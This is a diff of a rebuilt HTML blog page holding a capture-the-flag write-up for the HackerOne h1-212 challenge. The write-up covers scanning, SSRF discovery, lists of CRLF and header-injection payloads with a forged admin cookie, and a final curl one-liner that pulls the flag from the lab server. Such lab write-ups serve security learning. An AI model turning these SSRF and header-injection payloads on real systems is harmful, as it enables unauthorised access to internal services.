@@ -75,7 +75,7 @@ An engineer of acme.org launched a new server for a new admin panel at http://10
     <link rel="icon" type="image/png" href="https://10degres.net/assets/img/favicon-32x32.png" sizes="32x32">
     <link rel="icon" type="image/png" href="https://10degres.net/assets/img/favicon-16x16.png" sizes="16x16">
 
-    <meta name="generator" content="Hugo 0.92.2" />
+    <meta name="generator" content="Hugo 0.102.2" />
   </head>
 
   <body class=" ">
@@ -159,10 +159,10 @@ Here is the tweet that tiggered the war:</p>
 <p>Below the different steps that led me to The Holy Flag.</p>
 <h2 id="step-1-first-things-first-find-an-attack-surface">Step 1, first things first: find an attack surface</h2>
 <p>As usual when I approach a new target, I immediately fired up my Burp Suite and started a directory scan with several tools like Cansina, Dirb and Dirsearch, each time with a different wordlist: SVNDigger, Robots Disallowed and Raft ones. Below the urls discovered:</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">http://104.236.20.43/index.html
-http://104.236.20.43/icons/README
-http://104.236.20.43/flag
-</code></pre></div><p>At the end of the scan I tried to compare the discovered items with my local Apache using <code>diff</code> to check if any modification occured but they were all identical.
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-fallback" data-lang="fallback"><span style="display:flex;"><span>http://104.236.20.43/index.html
+</span></span><span style="display:flex;"><span>http://104.236.20.43/icons/README
+</span></span><span style="display:flex;"><span>http://104.236.20.43/flag
+</span></span></code></pre></div><p>At the end of the scan I tried to compare the discovered items with my local Apache using <code>diff</code> to check if any modification occured but they were all identical.
 While <code>/index.html</code> is the default Apache index page, <code>/icons/README</code> the default Apache icons list and of course it would be too easy if this <code>/flag</code> file would be the good one&hellip;<br>
 <img src="https://10degres.net/images/ctf-h1-212-fake-flag.png" alt="ctf h1-212 fake flag"></p>
 <p>At the same time I ran a Nmap scan on all TCP ports and top 500 UDP. This result to only two open ports: 22 and 80.
@@ -213,7 +213,7 @@ After playing a little bit with the value, injecting stupid characters and so on
 <p>The final response is the base64 encoded result of the HTTP request performed by the server. In this case: <code>http://localhost:80/index.html</code> the default Apache page.</p>
 <p><strong>Important note:</strong> at each HTTP POST request performed by the server, <code>id</code> is incremented by 1.
 Sometimes it get back to 0 but I didn&rsquo;t figure out why/when/how. It doesn&rsquo;t seem to be shared between the hackers.</p>
-<h2 id="step-3-or-4-or-5-port-scanning">Step 3' or 4 or 5, port scanning</h2>
+<h2 id="step-3-or-4-or-5-port-scanning">Step 3&rsquo; or 4 or 5, port scanning</h2>
 <p>I&rsquo;m pretty sure that this step was supposed to be the last one but when I&rsquo;m able to trigger a SSRF issue, I always perform a port scan first.</p>
 <p>I simply moved my 2 curl requests into a <code>for</code> loop that iterates from 1 to 65535, because why not ?
 Ok, Jobert said that brute force is not the key but you know&hellip; I&rsquo;m still a kid in my mind, I&rsquo;m a geek, I&rsquo;m a hacker so&hellip;
@@ -240,26 +240,26 @@ Dealing with <code>\r</code> and <code>\n</code> I quickly got a strange behavio
 Does it matter ? Well I don&rsquo;t know, maybe those servers don&rsquo;t react to CRLF the same way&hellip;</p>
 <p>Since the first part of the domain must contain <code>212</code> and the last part must end by <code>.com</code>, I had configure a dns <code>A</code> record of my own domain to point to <code>127.0.0.1</code>, that was useless but hey, how could I know!
 Based on the &ldquo;3 parts payload&rdquo; mentionned by Orange Tsai, here are some stuff I tried:</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">poc212.10degres.net:1337/flag @www.google.com @h1-212.acme.com
-poc212.10degres.net:1337/\r @www.google.com\r @h1-212.acme.com
-poc212.10degres.net:1337\r\t@www.google.com\r\t@h1-212.acme.com
-poc212.10degres.net:1337\s@www.google.com\s@h1-212.acme.com
-poc212.10degres.net:1337\r\n@www.google.com\r\n@h1-212.acme.com
-poc212.10degres.net:1337 @\r\nwww.google.com @\r\nh1-212.acme.com
-poc212.10degres.net:1337 @/flag @h1-212.acme.com
-poc212.10degres.net:1337 @www.google.com @/h1-212.acme.com
-</code></pre></div><p>After some hours (&hellip;) I decided to use the SSRF against my own server, that way I could see what kind of requests the CTF server send.
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-fallback" data-lang="fallback"><span style="display:flex;"><span>poc212.10degres.net:1337/flag @www.google.com @h1-212.acme.com
+</span></span><span style="display:flex;"><span>poc212.10degres.net:1337/\r @www.google.com\r @h1-212.acme.com
+</span></span><span style="display:flex;"><span>poc212.10degres.net:1337\r\t@www.google.com\r\t@h1-212.acme.com
+</span></span><span style="display:flex;"><span>poc212.10degres.net:1337\s@www.google.com\s@h1-212.acme.com
+</span></span><span style="display:flex;"><span>poc212.10degres.net:1337\r\n@www.google.com\r\n@h1-212.acme.com
+</span></span><span style="display:flex;"><span>poc212.10degres.net:1337 @\r\nwww.google.com @\r\nh1-212.acme.com
+</span></span><span style="display:flex;"><span>poc212.10degres.net:1337 @/flag @h1-212.acme.com
+</span></span><span style="display:flex;"><span>poc212.10degres.net:1337 @www.google.com @/h1-212.acme.com
+</span></span></code></pre></div><p>After some hours (&hellip;) I decided to use the SSRF against my own server, that way I could see what kind of requests the CTF server send.
 Installing and configuring Nginx. Configuring a <code>.com</code> domain I have and the vhost that will be accepted by Jobert&rsquo;s code as well.
 Same same but different:</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">poc212.10degres.net:1337/flag @www.google.com @h1-212.10degres.com
-poc212.10degres.net:1337/\r @www.google.com\r @h1-212.10degres.com
-poc212.10degres.net:1337\r\t@www.google.com\r\t@h1-212.10degres.com
-poc212.10degres.net:1337\s@www.google.com\s@h1-212.10degres.com
-poc212.10degres.net:1337\r\n@www.google.com\r\n@h1-212.10degres.com
-poc212.10degres.net:1337 @\r\nwww.google.com @\r\nh1-212.10degres.com
-poc212.10degres.net:1337 @/flag @h1-212.10degres.com
-poc212.10degres.net:1337 @www.google.com @/h1-212.10degres.com
-</code></pre></div><p>Checking the log, again and again and still got this f*****g error 400:
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-fallback" data-lang="fallback"><span style="display:flex;"><span>poc212.10degres.net:1337/flag @www.google.com @h1-212.10degres.com
+</span></span><span style="display:flex;"><span>poc212.10degres.net:1337/\r @www.google.com\r @h1-212.10degres.com
+</span></span><span style="display:flex;"><span>poc212.10degres.net:1337\r\t@www.google.com\r\t@h1-212.10degres.com
+</span></span><span style="display:flex;"><span>poc212.10degres.net:1337\s@www.google.com\s@h1-212.10degres.com
+</span></span><span style="display:flex;"><span>poc212.10degres.net:1337\r\n@www.google.com\r\n@h1-212.10degres.com
+</span></span><span style="display:flex;"><span>poc212.10degres.net:1337 @\r\nwww.google.com @\r\nh1-212.10degres.com
+</span></span><span style="display:flex;"><span>poc212.10degres.net:1337 @/flag @h1-212.10degres.com
+</span></span><span style="display:flex;"><span>poc212.10degres.net:1337 @www.google.com @/h1-212.10degres.com
+</span></span></code></pre></div><p>Checking the log, again and again and still got this f*****g error 400:
 <img src="https://10degres.net/images/ctf-h1-212-nginx-400.png" alt="ctf h1-212 nginx 400"></p>
 <p>Better use Netcat to see the headers received:<br>
 <img src="https://10degres.net/images/ctf-h1-212-netcat-400.png" alt="ctf h1-212 netcat 400"></p>
@@ -267,8 +267,8 @@ poc212.10degres.net:1337 @www.google.com @/h1-212.10degres.com
 <img src="https://10degres.net/images/ctf-h1-212-tcpdump.png" alt="ctf h1-212 tcpdump"></p>
 <p>Still nothing&hellip; Let&rsquo;s try something a bit more tricky. What about CRLF combined with header injection ?
 My new payload looked like:</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">poc212.10degres.net:1337/flag HTTP/1.0\rHost: admin.acme.org\rCookie: admin=yes\r @h1-212.10degres.com
-</code></pre></div><p><img src="https://10degres.net/images/ctf-h1-212-header-injection.png" alt="ctf h1-212 header injection"></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-fallback" data-lang="fallback"><span style="display:flex;"><span>poc212.10degres.net:1337/flag HTTP/1.0\rHost: admin.acme.org\rCookie: admin=yes\r @h1-212.10degres.com
+</span></span></code></pre></div><p><img src="https://10degres.net/images/ctf-h1-212-header-injection.png" alt="ctf h1-212 header injection"></p>
 <p>Hey but what about encoding ? Yeah yeah yeah I tried that too, since <code>%</code> is not allowed, I had to try something else:
 <code>\x0A</code> <code>0x0A</code> <code>\u000A</code> and the whole family, of course it didn&rsquo;t work&hellip;</p>
 <p>At the end of the day, the great <a href="https://twitter.com/EdOverflow">@EdOverflow</a> gave me a hint, <em>kudos</em> to him.
@@ -277,8 +277,8 @@ That said, after a full day on this shit (and some violent outrage against Jober
 <p>Next day, let&rsquo;s recap what I learned the day before:
 the first part and the third part of the three part payload (found in Orange Tsai doc) are injectable and trigger the SSRF to a domain I can control and depending of the characters I use for the CRLF (<code>\t</code> <code>\s</code> <code>\r</code> <code>\s</code> <code>\b</code> <code>💩</code>)  the server acts different, which seems to be logic&hellip;</p>
 <p>Ok! New payloads on the way:</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">0:1337/flag\r\nh1-212.10degres.com
-</code></pre></div><p>No more luck, I continued to alter it with different characters, different encoding.
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-fallback" data-lang="fallback"><span style="display:flex;"><span>0:1337/flag\r\nh1-212.10degres.com
+</span></span></code></pre></div><p>No more luck, I continued to alter it with different characters, different encoding.
 I also tried different protocols found in the SSRF bible: http, https, file, gopher, dict, mailto and so on&hellip;
 With a good wordlist and a <code>for</code> loop it was easy to test them all but unfortunately no matter what I tried, my script always returned empty data.</p>
 <p>One more day wasted for nothing, I didn&rsquo;t move forward :/
@@ -305,8 +305,8 @@ FLAG: CF,2dsV\/]fRAYQ.TDEp`w&quot;M(%mU;p9+&hellip;&hellip;&hellip;</p>
 <h2 id="conclusion">Conclusion</h2>
 <p>Pay attention to all details, stupid idiot!</p>
 <p>Jobert&rsquo;s answer in 1 single line:</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">D=104.236.20.43/;eval echo $(C=admin=yes;H=&#39;Host:http://admin.acme.org &#39;;N=$(curl -H&#39;Content-Type:application/json&#39; -H$H -b$C -d&#39;{&#34;domain&#34;:&#34;0:1337/flag\n212..com&#34;}&#39; &#34;$D&#34;|egrep -o &#39;[0-9]+&#39;);curl -H$H -b$C &#34;$D&#34;read.php?id=`expr $N - 1`|jq .[])|base64 --decode
-</code></pre></div><p>Winners:<br>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-fallback" data-lang="fallback"><span style="display:flex;"><span>D=104.236.20.43/;eval echo $(C=admin=yes;H=&#39;Host:http://admin.acme.org &#39;;N=$(curl -H&#39;Content-Type:application/json&#39; -H$H -b$C -d&#39;{&#34;domain&#34;:&#34;0:1337/flag\n212..com&#34;}&#39; &#34;$D&#34;|egrep -o &#39;[0-9]+&#39;);curl -H$H -b$C &#34;$D&#34;read.php?id=`expr $N - 1`|jq .[])|base64 --decode
+</span></span></code></pre></div><p>Winners:<br>
 <a href="https://twitter.com/EdOverflow">@EdOverflow</a><br>
 <a href="https://twitter.com/albinowax">@albinowax</a><br>
 <a href="https://twitter.com/erbbysam">@erbbysam</a></p>
